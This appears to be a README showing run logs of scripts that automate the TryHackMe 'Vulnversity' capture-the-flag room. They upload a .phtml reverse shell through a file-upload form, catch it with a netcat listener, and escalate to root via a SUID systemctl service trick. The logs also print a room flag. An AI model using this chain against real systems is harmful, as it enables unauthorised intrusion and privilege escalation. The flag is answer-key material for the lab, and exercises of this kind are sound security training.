Task Vulnversity from TryHackMe: https://tryhackme.com/room/vulnversity

### Reverse shell (Bash + nmap + gobuster + curl)
```
$ ./rev_shell.sh 10.10.92.174
[NMAP] Searching for http ports
[NMAP] Found http port: 3333
[GOBUSTER] Searching for internal in 10.10.92.174:3333
[GOBUSTER] Searching for uploads in 10.10.92.174:3333/internal
[CURL] Found allowed extention phtml
[CURL] Uploaded reverse shell script hack.phtml
[REVSH] Please start NetCat in other window to receive reverse shell connection to current IP 10.8.28.157:

nc -lvnp 6666

[Press Enter when ready]
[CURL] Opening reverse shell from http://10.10.92.174:3333/internal/uploads/hack.phtml
WARNING: Failed to daemonise.  This is quite common and not fatal.
Successfully opened reverse shell to 10.8.28.157:6666
ERROR: Shell connection terminated
```

### Privilege escalation (Python + pwn)
```
$ python3 priv_escalation.py 6666
[+] Trying to bind to 0.0.0.0 on port 6666: Done
[+] Waiting for connections on 0.0.0.0:6666: Got connection from 10.10.92.174 on port 49352
Found match: /bin/systemctl
[PAYLOAD] Executing: b'cat /home/bill/user.txt'
[PAYLOAD] Execution log:
$ > > > > > > Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.dGkZGsC2rY.service to /tmp/tmp.dGkZGsC2rY.service.
Created symlink from /etc/systemd/system/tmp.dGkZGsC2rY.service to /tmp/tmp.dGkZGsC2rY.service.

[PAYLOAD] Result:
$ 8bd7992fbe8a6ad22a63361004cfcedb

[*] Closed connection to 10.10.92.174 port 49352
```
